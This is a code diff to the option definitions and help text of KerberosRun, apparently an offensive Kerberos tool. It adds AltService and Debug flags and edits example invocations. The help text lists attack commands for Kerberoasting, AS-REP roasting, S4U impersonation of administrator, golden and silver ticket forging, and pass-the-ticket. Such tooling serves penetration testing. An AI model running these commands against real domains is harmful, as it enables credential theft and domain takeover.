@@ -52,16 +52,19 @@ namespace KerberosRun
         public string User { get; set; }
 
         [Option("Impersonateuser", Default = null, HelpText = "Impersonate Username")]
-        public string Impersonate { get; set; }
+        public string ImpersonateUser { get; set; }
 
-        [Option("Pass", Default = null, HelpText = "Password")]
-        public string Pass { get; set; }
+        [Option("Password", Default = null, HelpText = "Password")]
+        public string Password { get; set; }
 
         [Option("Host", Default = null, HelpText = "Target Server")]
         public string Host { get; set; }
 
         [Option("Service", Default = null, HelpText = "Service for a sliver ticket")]
         public string Service { get; set; }
+
+        [Option("AltService", Default = null, HelpText = "Change the service name for a ticket")]
+        public string AltService { get; set; }
 
         [Option("RC4", Default = null, HelpText = "RC4 Hash")]
         public string RC4 { get; set; }
@@ -101,6 +104,9 @@ namespace KerberosRun
 
         [Option("Verbose", Default = false, HelpText = "Verbose")]
         public bool Verbose { get; set; }
+
+        [Option("Debug", Default = false, HelpText = "Debug")]
+        public bool Debug { get; set; }
 
         [Option("Outfile", Default = false, HelpText = "Write Kirbi file.")]
         public bool Outfile { get; set; }
@@ -179,10 +185,10 @@ Example:
         .\KerberosRun.exe --Asktgs --user username --pass password --spn service/srv.domain.com --verbose --outfile
         .\KerberosRun.exe --Asreproast --user username --verbose
         .\KerberosRun.exe --Kerberoast --user username --rc4 [RC4Hash] --spn service/srv.domain.com
-        .\KerberosRun.exe --S4U2Self --user username --aes128 [AES128Hash] --impersonateuser administrator --verbose
+        .\KerberosRun.exe --S4U2Self --user username --aes128 [AES128Hash] --impersonateuser administrator --altservice service/srv.domain.com --verbose --ticket [Base64Ticket]
         .\KerberosRun.exe --S4U --user username --aes256 [AES256Hash] --impersonateuser administrator --spn ldap/dc1.domain.com --ptt
         .\KerberosRun.exe --Golden --user administrator --domain domain.com --userid 500 --domainsid  [DomainSID] --RC4 [krbtgtHash] --ptt
-        .\KerberosRun.exe --Sliver --user administrator --domain domain.com --domainsid  [DomainSID] --RC4 [srvHash] --Service HTTP --HOST DC01$ -ptt
+        .\KerberosRun.exe --Sliver --user administrator --domain domain.com --domainsid  [DomainSID] --RC4 [srvHash] --Service HTTP --HOST DC01$ --ptt
         .\KerberosRun.exe --Ticket Base64EncodedKirbiString/KirbiTicketFiles
                 ";
             System.Console.WriteLine(help);
